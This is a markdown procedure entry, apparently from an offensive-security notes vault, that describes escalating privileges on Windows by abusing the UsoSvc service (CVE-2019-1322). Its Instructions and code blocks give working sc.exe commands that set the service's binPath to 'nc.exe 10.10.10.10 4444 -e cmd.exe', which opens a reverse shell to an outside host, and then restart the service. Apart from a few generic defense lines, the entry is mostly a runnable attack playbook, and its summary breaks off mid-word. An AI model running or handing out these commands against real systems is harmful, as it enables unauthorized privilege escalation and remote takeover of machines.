---
id: d96f51d6-3c3d-41a9-bbd4-9ff1bcc887f5
name: UsoSvc Service Account Remote Command Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:29.506676+00:00'
updated_at: '2023-04-10T20:37:42.289343+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
- '[[Service Execution|T1035 - Service Execution]]'
tags:
- '[[EoP - Incorrect permissions in services]]'
- '[[Example with Windows 10 - CVE-2019-1322 UsoSvc]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444]]'
- '[[Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444]]'
- '[[Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444]]'
- '[[Query UsoSvc service configuration]]'
- '[[Start UsoSvc service]]'
- '[[Stop UsoSvc service]]'
---

# UsoSvc Service Account Remote Command Execution

## Summary

UsoSvc Service Account Remote Command Execution is a technique used to escalate privileges on a Windows system. This technique exploits incorrect permissions in services, specifically the UsoSvc service account. An attacker can use this vulnerability to execute arbitrary code with elevated privileg

## Description

# Description

UsoSvc Service Account Remote Command Execution is a technique used to escalate privileges on a Windows system. This technique exploits incorrect permissions in services, specifically the UsoSvc service account. An attacker can use this vulnerability to execute arbitrary code with elevated privileges, which could lead to complete system compromise.

To exploit this vulnerability, an attacker must first gain access to a low-privileged account on the target system. The attacker can then use this account to execute commands via the UsoSvc service account, which has higher privileges. This technique can be used to bypass access controls and gain elevated privileges, allowing the attacker to perform malicious actions on the compromised system.

This technique can be used by attackers to gain access to sensitive data, install malware, or perform other malicious actions that could harm the target organization.

## Requirements

1. Access to a low-privileged account on the target system

1. Ability to execute commands via the UsoSvc service account

## Defense

1. Ensure that all services are running with the lowest possible privileges

1. Limit the use of high-privileged accounts to only necessary tasks

1. Regularly patch and update all software to prevent known vulnerabilities

## Objectives

1. Escalate privileges on a Windows system

1. Execute arbitrary code with elevated privileges

1. Bypass access controls and gain elevated privileges

# Instructions

1. Execute the following commands in the command prompt to stop the UsoSvc service and configure it to execute a remote command:
1. sc.exe stop UsoSvc
2. sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
3. sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
4. sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
5. sc.exe qc usosvc
6. sc.exe start UsoSvc

**Code**: [[PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\W]]

> This command is used to execute a remote command via the UsoSvc service account. The service account must be present on the target system. The command stops the UsoSvc service, configures it to execute a remote command, and starts the service again. The remote command executed is 'nc.exe 10.10.10.10 4444 -e cmd.exe', which establishes a reverse shell to the IP address 10.10.10.10 on port 4444. The attacker can use this shell to execute further commands on the target system.

**Command** ([[Stop UsoSvc service]]):

```bash
sc.exe stop UsoSvc
```

**Command** ([[Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444]]):

```bash
sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

**Command** ([[Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444]]):

```bash
sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

**Command** ([[Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444]]):

```bash
sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

**Command** ([[Query UsoSvc service configuration]]):

```bash
sc.exe qc usosvc
```

**Command** ([[Start UsoSvc service]]):

```bash
sc.exe start UsoSvc
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]
- [[Service Execution|T1035 - Service Execution]]

## Commands Used

- [[Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444]]
- [[Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444]]
- [[Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444]]
- [[Query UsoSvc service configuration]]
- [[Start UsoSvc service]]
- [[Stop UsoSvc service]]

## Tags

- [[EoP - Incorrect permissions in services]]
- [[Example with Windows 10 - CVE-2019-1322 UsoSvc]]
- [[Windows - Privilege Escalation]]
